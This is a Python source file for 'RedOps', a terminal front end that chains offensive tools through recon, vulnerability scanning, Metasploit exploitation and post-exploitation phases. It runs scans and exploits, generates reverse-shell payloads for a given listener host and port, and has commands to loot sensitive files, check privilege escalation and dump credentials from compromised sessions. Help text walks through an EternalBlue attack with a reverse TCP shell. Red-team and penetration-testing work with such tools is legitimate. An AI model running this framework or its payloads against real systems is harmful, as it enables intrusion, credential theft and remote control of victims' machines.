import os
import asyncio
import signal
import shutil
import subprocess

from textual.app import App, ComposeResult
from textual.widgets import Input, Header, Footer, Static
from textual.containers import Horizontal, Vertical

from ui.widgets import OutputPanel
from ui.banners import redops_banner, recon_banner, vuln_banner, exploit_banner, post_exploit_banner
from ui.military import alert, success, status, intel, unit


class RedOps(App):
    CSS_PATH = "style.tcss"
    TITLE = "RedOps"

    BINDINGS = [
        ("ctrl+c", "cancel_task", "Abort Operation"),
        ("ctrl+l", "clear_output", "Clear Screen"),
    ]

    def __init__(self):
        super().__init__()
        self.current_process = None
        self.running_processes = []
        self.exploit_engine = None
        
    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)

        with Horizontal():
            yield Static(
                "[bold red]PHASE MONITOR[/bold red]\n"
                "━━━━━━━━━━━━━━\n\n"
                "[yellow]STANDBY[/yellow]",
                id="targets"
            )

            with Vertical():
                yield OutputPanel(id="output")
                yield Input(placeholder="redops > ", id="cmd")

        yield Footer()

    def update_target_panel(self, target="NONE", phase="STANDBY", operation="IDLE"):
        panel = self.query_one("#targets", Static)

        phase_color = {
            "STANDBY": "yellow",
            "RECON": "cyan",
            "VULNERABILITY SCANING": "yellow",
            "EXPLOIT": "red",
            "POST": "magenta",
            "POST-EXPLOIT": "magenta"
        }.get(phase.upper(), "white")

        panel.update(
            "[bold red]PHASE MONITOR[/bold red]\n"
            "━━━━━━━━━━━━━━\n\n"
            f"[bold {phase_color}]{phase.upper()}[/bold {phase_color}]"
        )

    def tool_exists(self, tool: str):
        import shutil
        return shutil.which(tool)

    async def on_mount(self):
        signal.signal(signal.SIGINT, lambda *_: self.action_cancel_task())

        output = self.query_one("#output", OutputPanel)
        output.write(redops_banner())
        output.write(status("Tactical console online"))
        output.write(intel("Awaiting mission parameters...\n"))
        self.update_target_panel()

        try:
            from modules.exploit import msf
            self.msf = msf  
            
            if self.msf.is_available():
                output.write(success("Offensive module: READY (Metasploit available)"))
            else:
                output.write(alert("Offensive module: DEGRADED (Metasploit not found)"))
                output.write(intel("Install Metasploit Framework for exploitation"))
                
        except ImportError as e:
            output.write(alert(f"Failed to load exploitation module: {str(e)}"))


    def _save_simple_log(self, action: str, session_id: str, result: dict) -> str:
        """Save post-exploit results to a simple log file"""
        from datetime import datetime
        
        try:
           
            log_dir = "./logs/post_exploit"
            os.makedirs(log_dir, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{log_dir}/session_{session_id}_{action}_{timestamp}.txt"
            
            lines = []
            lines.append(f"RedOps Post-Exploitation Report")
            lines.append(f"Date/Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            lines.append(f"Session: {session_id}")
            lines.append(f"Action: {action}")
            lines.append(f"Status: {'SUCCESS' if result.get('success') else 'FAILED'}")
            lines.append("=" * 80)
            
            if result.get("success"):
                if "message" in result:
                    lines.append(f"\nMessage: {result['message']}")
                
                if "os_type" in result:
                    lines.append(f"OS Type: {result['os_type']}")
                
                if "results" in result:
                    lines.append("\n=== RESULTS ===")
                    for section, content in result["results"].items():
                        if content:
                            lines.append(f"\n[{section.upper()}]")
                            lines.append("-" * len(section))
                            lines.append(content)
                
                elif "summary" in result and "results" in result["summary"]:
                    lines.append("\n=== RESULTS ===")
                    for section, content in result["summary"]["results"].items():
                        if content:
                            lines.append(f"\n[{section.upper()}]")
                            lines.append("-" * len(section))
                            lines.append(content)
            
            if not result.get("success") and "error" in result:
                lines.append(f"\n=== ERROR ===")
                lines.append(result["error"])
            
            lines.append("\n" + "=" * 80)
            lines.append("End of Report")
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write('\n'.join(lines))
            
            return filename
            
        except Exception as e:
            
            output = self.query_one("#output", OutputPanel)
            output.write(alert(f"Note: Failed to save log file: {str(e)}"))
            return "Failed to save"


    async def on_input_submitted(self, event: Input.Submitted):
        cmd = event.value.strip()
        event.input.clear()

        if self.running_processes and cmd not in ("stop", "kill", "abort"):
         output.write(alert("Operation running. Type 'stop' to abort."))
         return

        output = self.query_one("#output", OutputPanel)
        output.write(f"[bold red]»[/bold red] {cmd}")

        # =========================
        #        HELP SYSTEM
        # =========================
        if cmd == "help":

            output.write(redops_banner())

            output.write(intel("""
════════════════════════════════════════════════════
              REDOPS OFFENSIVE FRAMEWORK
════════════════════════════════════════════════════

Core Modules:
  recon        → Network & service reconnaissance
  web          → Web attack surface mapping
  vuln         → Vulnerability discovery
  exploit      → Exploitation & payload delivery
  post         → Post-exploitation & intelligence
  ad           → Active Directory recon/enum (created by Blue Phoenix)

Framework:
  tools        → Check operator environment
  clear        → Clear screen
  exit/quit    → Exit RedOps & Clear Caches

Usage:
  nmap help
  web help 
  ad help 
  vuln help 
  exploit help 
  exploit post help 

Global Shortcuts:
  Ctrl+C  → Abort active operation  
  Ctrl+L  → Clear screen  
  Ctrl+Q  → Quit framework  
  Ctrl+P  → Control panel (theme, layout, options)
  F11     → Toggle full screen 

Workflow:
  recon → vuln → exploit → post

Type a module name or use help <module>
════════════════════════════════════════════════════
"""))
            return


        if cmd == "clear":
            output.clear()
            output.write(redops_banner())
            return

        if cmd in ("stop", "kill", "abort"):
            self.action_cancel_task()
            return

        if cmd in ("exit", "quit"):
            output.write(status("Shutting down RedOps framework..."))

            self.action_cancel_task()

            removed = self.clear_pycache(".")

            output.write(success(f"Cleared {removed} __pycache__ directories"))
            output.write(intel("Framework shutdown complete"))

            await asyncio.sleep(0.5)
            self.exit()
            return

        # =====NMAP MODE =====
        if cmd.startswith("nmap"):

            if cmd in ("nmap help", "help nmap"):
                output.write("""
==================================
[bold red] SMART NMAP — Recon Engine [/bold red]
==================================

Usage:
  nmap <target>
    → Auto profile: -sCV -T4 -v

  nmap <flags> <target>
    → Full manual control

Examples:
  nmap 10.10.10.5
  nmap -p- 10.10.10.5
  nmap -sU -top-ports 50 10.10.10.5
  nmap -A 10.10.10.5

Notes:
• Auto mode only triggers when only target is supplied
• Raw nmap always supported
• Run as root for full accuracy
""")
                return

            parts = cmd.split()

            if len(parts) < 2:
                output.write(alert("Usage: nmap <target>  OR  nmap <flags> <target>"))
                return

            if len(parts) == 2:
                target = parts[1]
                cmd = f"nmap -sCV -T4 -v {target}"
                output.write(intel(f"Auto profile applied → {cmd}"))
            else:
                target = parts[-1]

            output.write(recon_banner())
            self.update_target_panel(target=target, phase="RECON", operation="NETWORK")
            output.write(status("Recon unit deployed"))

        if self.current_process and self.current_process.returncode is None:
            output.write(alert("Operation already running. Type 'stop' to abort."))
            return

        # ===== WEB RECON =====
        if cmd.startswith("web "):

            if cmd in ("web", "web help"):
                output.write("""
===================================
[bold red]WEB RECON — Red Team Web Unit[/bold red]
===================================
Usage:
  web <mode> <target> [wordlist]

Modes:
  curl   → headers + page preview
  dirs   → directory brute force
  fuzz   → ffuf fuzzing
  quick  → full fast recon chain

Examples:
  web curl http://10.10.10.5
  web dirs http://10.10.10.5
  web fuzz http://10.10.10.5
  web quick http://10.10.10.5

Wordlists:
• dirbuster medium
• dirb common
• wfuzz common

Stop running scan:
  stop
""")
                return

            parts = cmd.split()

            if len(parts) < 3:
                output.write(alert("Usage: web <curl|dirs|fuzz|quick> <target> [wordlist]"))
                return

            mode = parts[1]
            target = parts[2]

            DIR_WORDLIST = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            SMALL_WORDLIST = "/usr/share/wordlists/dirb/common.txt"
            WFUZZ_WORDLIST = "/usr/share/wordlist/wfuzz/general/common.txt"

            output.write(recon_banner())
            self.update_target_panel(target=target, phase="RECON", operation="WEB")
            output.write(status(f"Web unit deployed → {mode.upper()}"))

            web_tasks = []

            if mode == "curl":
                web_tasks = [
                    f"curl -I {target}",
                    f"curl -s {target} | head -n 40"
                ]

            elif mode == "dirs":
                web_tasks = [
                    f"gobuster dir -u {target} -w {DIR_WORDLIST} -t 30 --no-error",
                    f"gobuster dir -u {target} -w {SMALL_WORDLIST} -t 30 --no-error"
                ]

            elif mode == "fuzz":
                if len(parts) >= 4:
                    wordlist = parts[3]
                else:
                    wordlist = WFUZZ_WORDLIST

                web_tasks = [
                    f"ffuf -u {target} -w {wordlist} -mc 200,204,301,302,307,401,403"
                ]

            elif mode == "quick":
                web_tasks = [
                    f"curl -I {target}",
                    f"gobuster dir -u {target} -w {DIR_WORDLIST} -t 30 --no-error",
                    f"ffuf -u {target.rstrip('/')}/FUZZ -w {WFUZZ_WORDLIST} -mc 200,204,301,302,307,401,403"
                ]

            else:
                output.write(alert("Unknown web mode"))
                return

            for task in web_tasks:
                output.write(intel(f"Deploying → {task}"))
                asyncio.create_task(self.run_command(task))

            return
        

        # =========================
        #   ACTIVE DIRECTORY RECON
        # =========================
        if cmd.startswith("ad"):
            parts = cmd.split()

            if len(parts) == 1 or parts[1] == "help":
                output.write(intel("""
═══════════════════════════════
[bold red] ACTIVE DIRECTORY RECON MODULE [/bold red]
═══════════════════════════════

Usage:
  ad recon <target>

This command launches full automated
Active Directory reconnaissance using ADE.

--------------------------------------
ADE Core Options (reference)
--------------------------------------
-r / --rhosts   → Target IP / range (required)
-d / --domain   → Domain name
-f / --fqdn     → Domain controller FQDN
-u / --username → Username
-p / --password → Password
-H              → NTLM hash
--kerberos      → Kerberos auth
--no-pass       → Null session / anonymous

--------------------------------------
Examples:
--------------------------------------

ad recon 10.10.10.5
ad recon 192.168.1.0/24 -u <username> -p <password> ... 

--------------------------------------
Recon engine: ADE
Credits: Blue Phoenix
--------------------------------------

Tip: Run 'ade -h' in a terminal for full flags.
"""))
                return

            if len(parts) < 3:
                output.write(alert("Usage: ad recon <target>"))
                return

            mode = parts[1]
            target = parts[2]

            output.write(recon_banner())
            self.update_target_panel(target=target, phase="RECON", operation="ACTIVE_DIRECTORY")
            output.write(status("Active Directory recon engaged"))
            output.write(intel("Recon engine: ADE"))
            output.write(intel("Credits: Blue Phoenix"))

            if not self.tool_exists("ade"):
                output.write(alert("ADE not found in PATH"))
                output.write(intel("Install & test with: ade -h"))
                return

            if mode == "recon":
                extra_args = " ".join(parts[3:])  

                output.write(status(f"Launching ADE against {target}"))
                if extra_args:
                    output.write(intel(f"Auth / extra options → {extra_args}"))

                await self.run_command(f"ade -r {target} {extra_args}")
                return

            else:
                output.write(alert("Unknown AD mode. Use: ad help"))
                return 


        # =========================
        #   TOOL AVAILABILITY CHECK
        # =========================
        if cmd in ("check tools", "tools", "deps"):
            output.write(status("Scanning operator environment..."))

            toolsets = {
                "CORE": ["nmap", "curl", "ffuf", "gobuster"],
                "ACTIVE_DIRECTORY": ["ade", "ldapsearch", "smbclient"],
                "VULNERABILITY": ["nuclei", "nikto", "whatweb", "searchsploit"],
                "EXPLOITATION": ["msfconsole"],
                "NETWORK": ["dig", "nslookup"],
            }

            missing = False

            for category, tools in toolsets.items():

                output.write(unit(f"\n[{category}]"))

                for tool in tools:
                    path = self.tool_exists(tool)

                    if path:
                        output.write(success(f"{tool:<15} → OK ({path})"))
                    else:
                        output.write(alert(f"{tool:<15} → NOT FOUND"))
                        missing = True

            if missing:
                output.write(alert("\nSome operational capabilities are DEGRADED"))
            else:
                output.write(success("\nAll operational capabilities READY"))

            return

        # =========================
        #   VULNERABILITY SCANNING
        # =========================
        if cmd.startswith("vuln"):
            parts = cmd.split()

            if len(parts) == 1 or parts[1] == "help":
                output.write(intel("""
════════════════════════════
 [bold red] VULNERABILITY MODULE [/bold red]
════════════════════════════

vuln scan <ip>      → Full vulnerability sweep
vuln web <url>      → Web vulnerability sweep
vuln quick <target> → Fast vuln discovery

Engines used:
- nmap (vuln NSE, services)
- nuclei (CVE scanning)
- searchsploit (exploit mapping)
- nikto (web vulns)
- whatweb (tech fingerprinting)

imp:
 Each vulnerability engine (all nmap scripts, nuclei, nikto, etc.) can take up to ~5 minutes.  
 Long periods without output are normal during deep scans.
"""))
                return

            if len(parts) < 3:
                output.write(alert("Usage: vuln <scan|web|quick> <target>"))
                return

            mode = parts[1]
            target = parts[2]

            output.write(vuln_banner())
            
            self.update_target_panel(target=target, phase="VULNERABILITY SCANING", operation="SCAN/WEB/QUICK")
            self.refresh(layout=True)
            await asyncio.sleep(0)

            
            output.write(status("Vulnerability scanning phase engaged"))
            output.write(status("Deep vulnerability scanning started. Each engine may take several minutes."))

            required = ["nmap", "nuclei", "searchsploit", "nikto", "whatweb"]
            for tool in required:
                if not self.tool_exists(tool):
                    output.write(alert(f"Missing required tool: {tool}"))
                    return

            # ======================
            # FULL NETWORK VULN SCAN
            # ======================
            if mode == "scan":
                output.write(intel("Running Nmap vulnerability scripts"))
                output.write(status("Using all nmap script might take some time please wait..."))
                await self.run_command(f"nmap -sV --script vuln {target}")

                output.write(intel("Running Nuclei CVE scan"))
                await self.run_command(f"nuclei -u {target}")

                output.write(intel("Mapping exploits with Searchsploit"))
                await self.run_command(f"searchsploit {target}")

                output.write(success("Vulnerability scan completed"))
                return

            # ======================
            # WEB VULNERABILITY SCAN
            # ======================
            elif mode == "web":
                output.write(intel("Fingerprinting web technologies"))
                await self.run_command(f"whatweb {target}")

                output.write(intel("Running Nikto web vulnerability scan"))
                output.write(status("Nikto running (this may take several minutes, no live output is normal)"))
                await self.run_command(f"nikto -h {target}", timeout=300)

                output.write(intel("Running Nuclei web templates"))
                await self.run_command(f"nuclei -u {target}", timeout=300)

                output.write(success("Web vulnerability scan completed"))
                return

            # ======================
            # QUICK SCAN (CTF MODE)
            # ======================
            elif mode == "quick":
                output.write(intel("Fast service discovery"))
                await self.run_command(f"nmap -T4 -F {target}")

                output.write(intel("Quick nuclei scan"))
                await self.run_command(f"nuclei -u {target} -severity low,medium,high,critical")

                output.write(success("Quick scan completed"))
                return

            else:
                output.write(alert("Unknown vuln mode. Use: vuln help"))
                return

        # ===== COMPLETE METASPLOIT INTEGRATION =====

        if cmd.startswith("exploit") or cmd.startswith("msf"):
            self.update_target_panel(phase="EXPLOIT")
            parts = cmd.split()
            
            if not hasattr(self, 'msf') or self.msf is None:
                try:
                    from modules.exploit import msf
                    self.msf = msf
                except Exception as e:
                    output.write(alert(f"Failed to load Metasploit module: {e}"))
                    return
            
            if cmd.startswith("msf "):
                msf_command = cmd[4:]  
                
                output.write(intel(f"[MSF] → {msf_command}"))
                
                result = await self.msf.execute_command(msf_command)
                
                if result["success"]:
                    if result.get("output"):
                        output.write(intel("Output:"))
                        output.write("─" * 70)
                        
                        for line in result["output"].split('\n'):
                            if line.strip():
                                output.write(f"[cyan]{line}[/cyan]")
                        output.write("─" * 70)
                else:
                    output.write(alert(f"Failed: {result.get('error', 'Unknown error')}"))
                return
            
            if len(parts) == 1 or parts[1] == "help":
                output.write(intel("""
═════════════════════════════════
[bold red] EXPLOIT METASPLOIT MODULE [/bold red]
═════════════════════════════════

BASIC COMMANDS:
  exploit status          → Check Metasploit installation
  exploit search <keyword>→ Search for modules
  exploit info <module>   → Get module information
  exploit stop            → Stop all Exploit
   
MODULE OPERATIONS:
  exploit use <module>    → Select a module
  exploit options         → Show module options
  exploit set <opt> <val> → Set module option
  exploit payloads        → Show available payloads
  exploit set payload <payload> → Set payload

EXPLOIT EXECUTION:
  msf run / exploit run   → To run the Exploit  
  msf jobs                → To check all the active jobs

SESSION MANAGEMENT:
  exploit sessions        → List active sessions
  exploit session <id>    → Interact with session
  exploit kill <id>       → Kill a session
  exploit session <id> cmd <command> → Execute command in session

POST-EXPLOITATION:
  exploit post help          → Show post-exploit help
  exploit post <id> sysinfo  → Gather system intelligence
  exploit post <id> loot     → Find sensitive files
  exploit post <id> privesc  → Privilege escalation checks
  exploit post <id> lateral  → Lateral movement
  exploit post <id> creds    → Credential harvesting

PAYLOAD GENERATION:
  exploit payloadslist    → List custom payload types
  exploit payload <type> <lhost> <lport> [format] → Generate payload

QUICK COMMANDS: [for direct metasploit command execution]
  msf <any_command>       → Direct Metasploit command
  msf search <keyword>    → Search modules
  msf use <module>        → Use module
  msf set <opt> <val>     → Set option
  msf run                 → Run exploit
  msf sessions            → List sessions

EXAMPLES:
  exploit status
  exploit search eternalblue
  exploit use exploit/windows/smb/ms17_010_eternalblue
  exploit set RHOSTS 10.10.10.5
  exploit set LHOST 10.0.0.1
  exploit set payload generic/shell_reverse_tcp
  exploit run/msf run  
  msf jobs
  exploit sessions
  exploit post 1 sysinfo
  exploit stop 
  exploit kill <id>
  
additional direct quick cmd usage   
  msf search smb
  msf sessions
to generate payloads locally
  exploit payloadslist  
  exploit payload bash 10.0.0.1 4444 
═══════════════════════════════════════════════════════════
"""))
                return
            
            subcommand = parts[1] if len(parts) > 1 else ""
            
            if subcommand == "status":
                output.write(exploit_banner())
                if self.msf.is_available():
                    output.write(success("✓ Metasploit Framework is available"))
                else:
                    output.write(alert("✗ Metasploit not found in PATH"))
                return
            
            # ===== MODULE SEARCH & INFO =====
            
            if subcommand == "search" and len(parts) > 2:
                keyword = " ".join(parts[2:])
                output.write(exploit_banner())
                output.write(status(f"Searching for: {keyword}"))
                
                result = await self.msf.search_modules(keyword)
                
                if result["success"]:
                    if result.get("output"):
                        output.write(success("Search results:"))
                        output.write("=" * 80)
                        lines = result["output"].split('\n')
                        for line in lines:
                            if line.strip() and not line.startswith("[-]"):
                                output.write(f"[cyan]{line}[/cyan]")
                else:
                    output.write(alert("Search failed"))
                return
            
            if subcommand == "info" and len(parts) > 2:
                module_path = parts[2]
                output.write(exploit_banner())
                output.write(status(f"Getting info for: {module_path}"))
                
                result = await self.msf.get_module_info(module_path)
                
                if result["success"]:
                    if result.get("output"):
                        output.write(success("Module information:"))
                        output.write("=" * 80)
                        lines = result["output"].split('\n')
                        for line in lines:
                            if line.strip():
                                output.write(f"[cyan]{line}[/cyan]")
                else:
                    output.write(alert("Failed to get module info"))
                return
            
            # ===== MODULE OPERATIONS =====
            
            if subcommand == "use" and len(parts) > 2:
                module_path = parts[2]
                output.write(exploit_banner())
                output.write(status(f"Using module: {module_path}"))
                
                result = await self.msf.use_module(module_path)
                
                if result["success"]:
                    output.write(success("Module selected successfully!"))
                    output.write(intel("Now set options with: exploit set <option> <value>"))
                    output.write(intel("Then run with: exploit run"))
                else:
                    output.write(alert("Failed to use module"))
                return
            
            if subcommand == "options" or subcommand == "show":
                output.write(exploit_banner())
                output.write(status("Current module options from Metasploit:"))
                
                result = await self.msf.show_options()
                
                if result["success"]:
                    if result.get("output"):
                        lines = result["output"].split('\n')
                        
                        in_options_section = False
                        for line in lines:
                            if "Module options" in line or "Payload options" in line:
                                output.write(f"[bold yellow]{line}[/bold yellow]")
                                in_options_section = True
                            elif in_options_section and line.strip() and not line.startswith("   "):
                                break
                            elif in_options_section:
                                if "Current Setting" in line:
                                    continue  
                                if line.strip():
                                    if "Yes" in line and "Required" in line:
                                        output.write(f"[red]{line}[/red]")
                                    else:
                                        output.write(f"[cyan]{line}[/cyan]")
                        
                        output.write("")
                        output.write("[bold]Currently Configured:[/bold]")
                        if self.msf.active_payload:
                            output.write(f"  Payload: {self.msf.active_payload}")
                        for opt, val in self.msf.module_options.items():
                            if val:
                                output.write(f"  {opt}: {val}")
                else:
                    output.write(alert("No module selected or failed to show options"))
                return
            
            if subcommand == "set" and len(parts) > 3:
                option = parts[2]
                value = parts[3]
                output.write(status(f"Setting {option} = {value}"))
                
                result = await self.msf.set_option(option, value)
                
                if result["success"]:
                    output.write(success("Option set successfully"))
                else:
                    output.write(alert("Failed to set option"))
                return
            
            if subcommand == "payloads":
                output.write(exploit_banner())
                output.write(status("Available Metasploit payloads:"))
                
                result = await self.msf.show_payloads()
                
                if result["success"]:
                    if result.get("output"):
                        lines = result["output"].split('\n')
                        payload_lines = [l for l in lines if "payload/" in l]
                        for line in payload_lines[:30]:  
                            output.write(f"[cyan]{line}[/cyan]")
                        if len(payload_lines) > 30:
                            output.write(intel(f"... and {len(payload_lines) - 30} more payloads"))
                else:
                    output.write(alert("Failed to list payloads"))
                return
            
            if subcommand == "setpayload" and len(parts) > 2:
                payload = parts[2]
                output.write(status(f"Setting payload: {payload}"))
                
                result = await self.msf.set_payload(payload)
                
                if result["success"]:
                    output.write(success("Payload set successfully"))
                else:
                    output.write(alert("Failed to set payload"))
                return
            

            # ===== EXPLOIT EXECUTION =====
            
            if subcommand == "run" or subcommand == "exploit":
                output.write(exploit_banner())
                output.write(status("Running exploit..."))
                
                result = await asyncio.wait_for(
                    self.msf.run_exploit(),
                    timeout=35  
                )
                
                if result["success"]:
                    output.write(success("Exploit execution completed"))
                    if result.get("output"):
                        output.write(intel("Output:"))
                        lines = result["output"].split('\n')
                        for line in lines[-20:]:  
                            if line.strip():
                                output.write(f"[cyan]{line}[/cyan]")
                else:
                    output.write(alert("Exploit execution failed"))
                    if result.get("error"):
                        output.write(alert(f"Error: {result['error']}"))
                return
            
            if subcommand == "stop":
                output.write(status("Stopping all exploits..."))
                result = await self.msf.stop_exploit()
                if result["success"]:
                    output.write(success("All exploits stopped"))
                else:
                    output.write(alert("Failed to stop exploits"))
                return
            
            # ===== SESSION MANAGEMENT =====
            
            if subcommand == "sessions":
                output.write(exploit_banner())
                output.write(status("Active sessions:"))
                
                result = await self.msf.list_sessions()
                
                if result["success"]:
                    if result.get("output"):
                        lines = result["output"].split('\n')
                        for line in lines:
                            if line.strip():
                                output.write(f"[cyan]{line}[/cyan]")
                    else:
                        output.write(intel("No active sessions"))
                else:
                    output.write(alert("Failed to list sessions"))
                return
            
            if subcommand == "session" and len(parts) > 2:
                session_id = parts[2]
                
                if len(parts) > 4 and parts[3] == "cmd":
                    command = " ".join(parts[4:])
                    output.write(status(f"Executing in session {session_id}: {command}"))
                    
                    result = await self.msf.run_one_post_cmd(session_id, command)
                    
                    if result["success"]:
                        if result.get("output"):
                            output.write(f"[cyan]{result['output']}[/cyan]")
                    else:
                        output.write(alert("Failed to execute command"))
                else:
                    output.write(status(f"Interacting with session {session_id}"))
                    output.write(intel("Use: exploit session <id> cmd <command>"))
                return
            
            if subcommand == "kill" and len(parts) > 2:
                session_id = parts[2]
                output.write(status(f"Killing session {session_id}"))
                
                result = await self.msf.kill_session(session_id)
                
                if result["success"]:
                    output.write(success("Session killed"))
                else:
                    output.write(alert("Failed to kill session"))
                return
            
            # ===== PAYLOAD GENERATION =====
            
            if subcommand == "payloadslist":
                output.write(exploit_banner())
                output.write(status("Custom payload types:"))
                
                types = self.msf.list_payload_types()
                for i in range(0, len(types), 3):
                    line = ""
                    for j in range(3):
                        if i + j < len(types):
                            line += f"[cyan]{types[i+j]:20}[/cyan]"
                    output.write(line)
                output.write("")
                output.write(intel("Use: exploit payload <type> <lhost> <lport> [raw|base64|url|hex]"))
                return
            
            if subcommand == "payload" and len(parts) > 4:
                ptype = parts[2]
                lhost = parts[3]
                lport = parts[4]
                format_type = parts[5] if len(parts) > 5 else "raw"
                
                payload = self.msf.generate_payload(ptype, lhost, lport, format_type)
                
                output.write(success(f"{ptype} payload ({format_type}):"))
                output.write("=" * 70)
                output.write(f"[green]{payload}[/green]")
                output.write("=" * 70)
                output.write(intel("Copy and use in manual exploitation"))
                return
            
            

# =======================================================
#               POST EXPLOITATIOM 
# =======================================================
        
        if cmd.startswith("exploit post") or cmd.startswith("exploit pe"):
            parts = cmd.split()
            
            if len(parts) >= 3 and parts[1] in ["post", "pe"]:
                session_id = parts[2]
                action = parts[3] if len(parts) > 3 else "help"
                
                if action == "help":
                    output.write(post_exploit_banner())
                    output.write(intel("""
═══════════════════════════════════════
[bold red]POST-EXPLOITATION MODULE[/bold red]
═══════════════════════════════════════
  exploit post <id> sysinfo  → Gather system intelligence
  exploit post <id> loot     → Find sensitive files/data
  exploit post <id> privesc  → Check privilege escalation  
  exploit post <id> creds    → Dump credentials
  
[dim]Results are saved to: ./logs/post_exploit/[/dim]
  
[dim]Tip: First get a session with 'exploit run'[/dim]
                    """))
                    return
                
                output.write(post_exploit_banner())
                self.update_target_panel(phase="POST EXPLOIT")
                
                output.write(intel(f"Results will be saved to: ./logs/post_exploit/"))
                output.write(intel(f"Format: session_{session_id}_{action}_YYYYMMDD_HHMMSS.txt"))
                output.write("")                
                
                if not hasattr(self, 'post_exploit') or self.post_exploit is None:
                    try:
                        from modules.post_exploit import PostExploitEngine
                        self.post_exploit = PostExploitEngine(self.msf)
                    except ImportError as e:
                        output.write(alert(f"Failed to load post-exploit module: {e}"))
                        return
                
                # ===== SYSINFO =====
                if action == "sysinfo":
                    output.write(status(f"Gathering system info for session {session_id}..."))
                    
                    result = await self.post_exploit.gather_system_info(session_id)
                    
                    filename = self._save_simple_log("sysinfo", session_id, result)
                    
                    if result["success"]:
                        output.write(success(f"System Info for Session {session_id}:"))
                        output.write("─" * 60)
                        
                        if "summary" in result:
                            summary = result["summary"]
                            output.write(intel(f"Session Status: {'Active' if summary.get('exists') else 'Inactive'}"))
                            if summary.get("os_type"):
                                output.write(intel(f"OS Type: {summary.get('os_type', 'unknown')}"))
                        
                        if "results" in result.get("summary", {}):
                            results = result["summary"]["results"]
                            if results:
                                for desc, content in results.items():
                                    if content and content.strip():
                                        output.write(f"\n[bold]{desc}:[/bold]")
                                        lines = content.split('\n')
                                        for line in lines[:10]:
                                            if line.strip():
                                                output.write(f"  [cyan]{line}[/cyan]")
                                        if len(lines) > 10:
                                            output.write(f"  ... and {len(lines) - 10} more lines")
                            else:
                                output.write(intel("No command output received"))
                        
                        output.write("─" * 60)
                        output.write(success(f"Results saved to: {filename}"))
                        
                    else:
                        output.write(alert(f"Failed: {result.get('error', 'Unknown error')}"))
                    return
                
                # ===== LOOT =====
                elif action == "loot":
                    output.write(status(f"Searching for sensitive files in session {session_id}..."))
                    
                    result = await self.post_exploit.loot_sensitive_files(session_id)
                    
                    filename = self._save_simple_log("loot", session_id, result)
                    
                    if result["success"]:
                        output.write(success(f"File Looting Results for Session {session_id}:"))
                        output.write("─" * 60)
                        
                        if "results" in result:
                            results = result["results"]
                            if results:
                                for description, content in results.items():
                                    if content and content.strip():
                                        output.write(f"\n[bold]{description}:[/bold]")
                                        lines = content.split('\n')
                                        for line in lines[:15]:
                                            if line.strip():
                                                output.write(f"  [cyan]{line}[/cyan]")
                                        if len(lines) > 15:
                                            output.write(f"  ... and {len(lines) - 15} more lines")
                                        output.write("")
                            else:
                                output.write(intel("No sensitive files found or no output received"))
                        
                        if "os_type" in result:
                            output.write(intel(f"Target OS: {result['os_type']}"))
                        
                        output.write("─" * 60)
                        output.write(success(f"Results saved to: {filename}"))
                        
                    else:
                        output.write(alert(f"Failed: {result.get('error', 'Unknown error')}"))
                    return
                
                # ===== PRIVESC =====
                elif action == "privesc":
                    output.write(status(f"Checking privilege escalation vectors in session {session_id}..."))
                    
                    result = await self.post_exploit.check_privesc(session_id)
                    
                    filename = self._save_simple_log("privesc", session_id, result)
                    
                    if result["success"]:
                        output.write(success(f"Privilege Escalation Check for Session {session_id}:"))
                        output.write("─" * 60)
                        
                        if "results" in result:
                            results = result["results"]
                            if results:
                                for description, content in results.items():
                                    if content and content.strip():
                                        output.write(f"\n[bold]{description}:[/bold]")
                                        lines = content.split('\n')
                                        for line in lines[:20]:
                                            if line.strip():
                                                output.write(f"  [yellow]{line}[/yellow]")
                                        if len(lines) > 20:
                                            output.write(f"  ... and {len(lines) - 20} more lines")
                                        output.write("")
                            else:
                                output.write(intel("No privilege escalation vectors found"))
                        
                        if "os_type" in result:
                            output.write(intel(f"Target OS: {result['os_type']}"))
                        
                        output.write("─" * 60)
                        output.write(success(f"Results saved to: {filename}"))
                        
                    else:
                        output.write(alert(f"Failed: {result.get('error', 'Unknown error')}"))
                    return
                
                # ===== CREDS =====
                elif action == "creds":
                    output.write(status(f"Dumping credentials from session {session_id}..."))
                    
                    result = await self.post_exploit.dump_credentials(session_id)
                    
                    filename = self._save_simple_log("creds", session_id, result)
                    
                    if result["success"]:
                        output.write(success(f"Credential Dump Results for Session {session_id}:"))
                        output.write("─" * 60)
                        
                        if "results" in result:
                            results = result["results"]
                            if results:
                                for description, content in results.items():
                                    if content and content.strip():
                                        output.write(f"\n[bold red]{description}:[/bold red]")
                                        lines = content.split('\n')
                                        for line in lines[:25]:
                                            if line.strip():
                                                output.write(f"  [red]{line}[/red]")
                                        if len(lines) > 25:
                                            output.write(f"  ... and {len(lines) - 25} more lines")
                                        output.write("")
                            else:
                                output.write(intel("No credentials found or no output received"))
                        
                        if "os_type" in result:
                            output.write(intel(f"Target OS: {result['os_type']}"))
                        
                        output.write("─" * 60)
                        output.write(success(f"Results saved to: {filename}"))
                        
                    else:
                        output.write(alert(f"Failed: {result.get('error', 'Unknown error')}"))
                    return
                
                else:
                    output.write(alert(f"Unknown post-exploit action: {action}"))
                    output.write(intel("Available actions: sysinfo, loot, privesc, creds, help"))
                    return

            # ===== DEFAULT =====
            
            output.write(alert(f"Unknown command: {subcommand}"))
            output.write(intel("Use 'exploit help' for available commands"))
            return
            

        asyncio.create_task(self.run_command(cmd))


    async def run_command(self, cmd: str, timeout=None):
     output = self.query_one("#output", OutputPanel)
     proc = None

     try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            start_new_session=True
        )

        self.running_processes.append(proc)

        async def stream(pipe, color):
            while True:
                line = await pipe.readline()
                if not line:
                    break
                output.write(f"[{color}]{line.decode(errors='ignore').rstrip()}[/{color}]")

        stdout_task = asyncio.create_task(stream(proc.stdout, "cyan"))
        stderr_task = asyncio.create_task(stream(proc.stderr, "red"))

        if timeout:
            try:
                await asyncio.wait_for(proc.wait(), timeout)
            except asyncio.TimeoutError:
                output.write(alert("Scan timeout reached. Killing process..."))
                self._force_kill(proc)
        else:
            await proc.wait()

        await stdout_task
        await stderr_task

        if proc.returncode == 0:
            output.write(success("Operation completed\n"))
        else:
            output.write(alert(f"Operation exited with code {proc.returncode}\n"))

     except Exception as e:
